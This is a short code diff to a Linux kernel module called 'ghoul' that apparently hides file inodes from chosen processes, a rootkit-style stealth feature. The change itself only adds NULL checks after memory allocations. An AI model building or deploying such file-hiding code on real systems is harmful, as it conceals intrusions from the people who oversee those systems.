@@ -15,6 +15,12 @@ void hide_file_inode(unsigned long ino)
     pr_info("ghoul: hiding inode %lu\n", ino);
 
     inode_entry = kzalloc(sizeof(struct inode_list), GFP_KERNEL);
+
+    if (inode_entry == NULL) {
+        pr_err("ghoul: memory allocation error while hiding inode\n");
+        return;
+    }
+
     inode_entry->ino = ino;
     INIT_LIST_HEAD(&inode_entry->excluded_pids);
     list_add_tail(&inode_entry->list, &inodes_to_hide);
@@ -83,6 +89,12 @@ void show_file_inode(const void __user *user_info)
     else {
         pr_info("ghoul: showing inode %lu for PID %d\n", info.ino, info.pid);
         excluded_pid = kzalloc(sizeof(struct pid_list), GFP_KERNEL);
+
+        if (excluded_pid == NULL) {
+            pr_err("ghoul: memory allocation error while showing inode\n");
+            return;
+        }
+
         excluded_pid->pid = info.pid;
         list_add_tail(&excluded_pid->list, &hidden_inode->excluded_pids);
     }
